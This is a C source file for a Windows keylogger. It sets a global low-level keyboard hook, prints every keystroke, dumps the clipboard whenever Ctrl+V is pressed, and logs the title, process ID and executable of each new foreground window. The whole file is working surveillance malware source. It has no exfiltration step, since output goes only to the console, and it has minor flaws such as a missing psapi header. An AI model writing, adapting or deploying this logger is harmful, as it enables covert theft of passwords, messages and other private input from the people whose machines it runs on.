#include <stdio.h>
#include <stdbool.h>
#include <windows.h>
#include <winuser.h>

#define TIMEOUT (60 * 10)

HHOOK g_hook = NULL;
HWND g_current_window = NULL;

void get_current_process() {
    HWND hwnd = GetForegroundWindow();
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    HANDLE h_process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);

    char executable[512];
    GetModuleBaseNameA(h_process, NULL, executable, sizeof(executable));

    char window_title[512];
    GetWindowTextA(hwnd, window_title, sizeof(window_title));

    g_current_window = hwnd;
    printf("Window Title: %s\n", window_title);
    printf("Process ID: %lu\n", pid);
    printf("Executable: %s\n", executable);

    CloseHandle(h_process);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;
        if (pkbhs->vkCode == 'V' && wParam == WM_KEYDOWN) {
            if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0) {
                if (OpenClipboard(NULL)) {
                    HANDLE hData = GetClipboardData(CF_TEXT);
                    char* value = (char*)GlobalLock(hData);
                    printf("[PASTE] - %s\n", value);
                    GlobalUnlock(hData);
                    CloseClipboard();
                }
            }
        }
        else {
            char key = (char)pkbhs->vkCode;
            printf("%c", key);
        }
    }

    if (g_current_window != GetForegroundWindow()) {
        get_current_process();
    }

    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

void run() {
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0 && msg.message != WM_QUIT) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(g_hook);
}

int main() {
    run();
    printf("done.\n");
    return 0;
}
